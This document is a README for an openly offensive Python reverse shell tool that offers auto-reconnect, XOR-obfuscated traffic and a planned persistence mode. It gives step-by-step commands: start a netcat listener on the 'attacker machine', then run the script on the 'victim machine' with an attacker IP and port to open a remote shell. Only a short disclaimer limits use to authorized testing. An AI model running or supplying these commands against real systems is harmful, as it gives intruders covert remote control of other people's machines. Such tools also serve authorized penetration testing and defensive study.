# ReverseShell - All-in-One Reverse Shell Tool  

📱 **Developed by [karthithehacker](https://karthithehacker.com)**  

ReverseShell is an advanced reverse shell tool that supports **auto-reconnection, encryption, and cross-platform execution**. It helps security professionals test system defenses and understand shell-based attack vectors.  

---

## 🚀 Features  
- ✅ **Configurable Host & Port** (Command-line arguments)  
- ✅ **Auto-Reconnect** (If connection drops, it retries after a delay)  
- ✅ **Basic Encryption** (XOR-based obfuscation for data transfer)  
- ✅ **Cross-Platform Support** (Works on **Linux** & **Windows**)  
- ✅ **Error Handling & Logging** (Avoids crashes & logs failures)  

---

## 🔧 Installation & Setup  

### 1⃣ **Clone the Repository**  
```bash
 git clone https://github.com/yourusername/reverseshell.git
 cd reverseshell
```

### 2⃣ **Run the Listener (Attacker Machine)**  
On your Kali Linux/ParrotOS, start a Netcat listener:  
```bash
 nc -lvnp 4444
```

### 3⃣ **Execute the Reverse Shell (Victim Machine)**  
Run the script on the target system:  
```bash
 python3 reverseshell.py --host <attacker_ip> --port 4444
```

Example:  
```bash
 python3 reverseshell.py --host 192.168.1.100 --port 4444
```

---

## 🛠 Usage  

### **Basic Reverse Shell**  
```bash
 python3 reverseshell.py --host <attacker_ip> --port <port>
```

### **With Auto-Reconnect (Retry Every 10s)**  
```bash
 python3 reverseshell.py --host <attacker_ip> --port 4444 --reconnect 10
```

### **Windows Payload Example**  
```powershell
 python reverseshell.py --host 192.168.1.200 --port 9001
```

---

## 🔥 Roadmap  
- ✅ **Auto-Reconnect Support**  
- ✅ **Basic XOR Encryption**  
- 🚀 **AES Encryption for Secure Shells** (Upcoming)  
- 🚀 **Support for Reverse HTTP/S Shells**  
- 🚀 **Automated Persistence Mode**  

---

## ⚠️ Disclaimer  
**This tool is for educational and authorized penetration testing purposes only.**  
The developer is not responsible for any misuse or illegal activity conducted with this tool.  

---

## 👨‍💻 Author  
- 💻 Developed by [karthithehacker](https://karthithehacker.com)  
- 🌍 Website: [karthithehacker.com](https://karthithehacker.com)  
- 🐦 Twitter: [@karthithehacker](https://twitter.com/karthithehacker)  
- 📧 Email: [contact@karthithehacker.com](mailto:contact@karthithehacker.com)  

---

🌟 **If you like this tool, give it a star!** 🌟

